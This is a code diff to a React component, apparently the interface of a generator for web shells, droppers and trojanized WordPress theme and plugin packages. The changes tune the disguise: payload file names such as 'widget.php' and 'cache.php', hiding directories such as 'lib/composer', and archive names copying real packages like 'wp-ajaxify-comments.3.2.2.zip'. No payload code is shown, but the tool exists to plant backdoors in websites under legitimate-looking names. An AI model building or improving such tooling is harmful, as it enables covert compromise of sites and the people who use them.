@@ -40,7 +40,7 @@ export default function Generator() {
   const [harpyToken, setHarpyToken] = useState('')
   const [payloadFileName, setPayloadFileName] = useState('cache.php')
   const [packageArchiveName, setPackageArchiveName] = useState('envo-royal.1.0.14.zip')
-  const [payloadDirectory, setPayloadDirectory] = useState('php')
+  const [payloadDirectory, setPayloadDirectory] = useState('extra')
   const [archiveRootDir, setArchiveRootDir] = useState('envo-royal')
 
   const [result, setResult] = useState<{ fileName: string; authKey: string; content: string } | null>(null)
@@ -109,7 +109,7 @@ export default function Generator() {
                 setFormat('theme')
                 setPayloadFileName('cache.php')
                 setPackageArchiveName('envo-royal.1.0.14.zip')
-                setPayloadDirectory('php')
+                setPayloadDirectory('extra')
                 setArchiveRootDir('envo-royal')
               } else {
                 setFormat('php')
@@ -120,7 +120,7 @@ export default function Generator() {
             className={`px-3 py-1 rounded-sm text-xs font-semibold ${mode === m ? 'bg-accent text-content-primary' : 'text-content-secondary hover:text-content-primary'
               }`}
           >
-            {m === 'webshell' ? 'Web Shell' : m === 'dropper' ? 'Dropper' : 'WordPress Package'}
+            {m === 'webshell' ? 'Web Shell' : m === 'dropper' ? 'Dropper' : 'WordPress'}
           </button>
         ))}
       </div>
@@ -145,14 +145,14 @@ export default function Generator() {
               onClick={() => {
                 setFormat(f)
                 if (f === 'theme') {
-                  setPayloadFileName('cache.php')
+                  setPayloadFileName('widget.php')
                   setPackageArchiveName('envo-royal.1.0.14.zip')
-                  setPayloadDirectory('php')
+                  setPayloadDirectory('extra')
                   setArchiveRootDir('envo-royal')
                 } else {
-                  setPayloadFileName('widget.php')
+                  setPayloadFileName('cache.php')
                   setPackageArchiveName('wp-ajaxify-comments.3.2.2.zip')
-                  setPayloadDirectory('php')
+                  setPayloadDirectory('lib/composer')
                   setArchiveRootDir('wp-ajaxify-comments')
                 }
               }}
@@ -316,11 +316,11 @@ export default function Generator() {
                     Copy
                   </button>
                 ) : (
-                  <button 
+                  <button
                     onClick={() => {
                       const archivePath = `${archiveRootDir ? archiveRootDir.replace(/\/$/, '') + '/' : ''}${payloadDirectory ? payloadDirectory.replace(/\/$/, '') + '/' : ''}${payloadFileName}`;
                       copyText(archivePath);
-                    }} 
+                    }}
                     className="text-xs text-accent-secondary hover:text-accent-secondary-hover"
                   >
                     Copy Path
